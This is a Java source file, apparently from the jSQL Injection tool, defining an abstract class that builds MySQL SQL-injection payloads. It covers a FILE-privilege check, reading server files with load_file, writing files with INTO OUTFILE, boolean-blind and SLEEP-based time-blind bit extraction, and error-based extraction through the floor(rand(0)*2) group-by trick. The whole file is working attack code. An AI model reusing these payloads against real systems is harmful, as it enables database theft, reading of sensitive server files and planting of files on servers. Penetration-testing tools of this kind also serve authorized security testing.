package com.jsql.model.vendor;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public abstract class ASQLStrategy {    
    abstract public String getDbLabel();
    
    abstract public String getSchemaInfos();
    abstract public String getSchemaList();
    abstract public String getTableList(Database database);
    abstract public String getColumnList(Table table);
    abstract public String getValues(String[] arrayColumns, Database database, Table table);

    abstract public String normalStrategy(String sqlQuery, String startPosition);
    
    abstract public String getIndicesCapacity(String[] indexes);
    abstract public String getIndices(Integer nbFields);
    abstract public String getOrderBy();
    
    abstract public String getLimit(Integer limitSQLResult);
    
    public String getPrivilege() {
        return
            /**
             * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
             * => forcage en charactère
             */
            "cast(" +
                "concat(" +
                    "(" +
                        "select+" +
                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
                        "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
                        "where+" +
                            "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
                            "and+PRIVILEGE_TYPE=0x46494c45" +
                    ")" +
                    "," +
                    "0x01030307" +
                ")" +
            "+as+char)";
    }

    public String readTextFile(String filePath) {
        return
            /**
             * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
             * => forcage en charactère
             */
             "cast(" +
                 "concat(load_file(0x" + ToolsString.strhex(filePath) + "),0x01030307)" +
             "as+char)";
    }

    public String writeTextFile(String content, String filePath) {
        return
            MediatorModel.model().initialQuery
                .replaceAll(
                    "1337" + MediatorModel.model().visibleIndex + "7331",
                    "(select+0x" + ToolsString.strhex(content) + ")"
                )
                .replaceAll("--++", "")
                + "+into+outfile+\"" + filePath + "\"--+";
    }

    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    public String getBlindFirstTest() {
        return "0%2b1=1";
    }

    public String blindCheck(String check) {
        return "+and+" + check + "--+";
    }

    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    public String blindLengthTest(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    public String timeCheck(String check) {
        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    public String timeLengthTest(String inj, int indexCharacter) {
        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    public String blindStrategy(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                "concat(" +
                    "0x53514c69," +
                    "mid(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        MediatorModel.model().performanceLength +
                    ")" +
                ")" +
            ")";
    }

    public String getErrorBasedStrategyCheck() {
        return
            "+and(" +
                "select+1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "floor(rand(0)*2)" +
                    "from+" +
                        "information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return
            "+and" +
                "(" +
                "select+" +
                    "1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "concat(" +
                            "0x53514c69," +
                            "replace(" +
                                "mid(" +
                                    "replace(" +
                                        "(" + sqlQuery + ")" +
                                    /**
                                     * message error base remplace le \r en \r\n => pb de comptage
                                     * Fix: remplacement forcé 0x0D => 0x0000
                                     */
                                    ",0x0D,0x0000)," +
                                    startPosition + "," +
                                    /**
                                     * errorbase renvoit 64 caractères: 'SQLi' en consomme 4
                                     * inutile de renvoyer plus de 64
                                     */
                                    "60" +
                                ")" +
                            /**
                             * rétablissement 0x0000 => 0x0D
                             */
                            ",0x0000,0x0D)," +
                            "floor(rand(0)*2)" +
                        ")" +
                    "from+information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    public String timeStrategy(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")" +
            ")";
    }
}
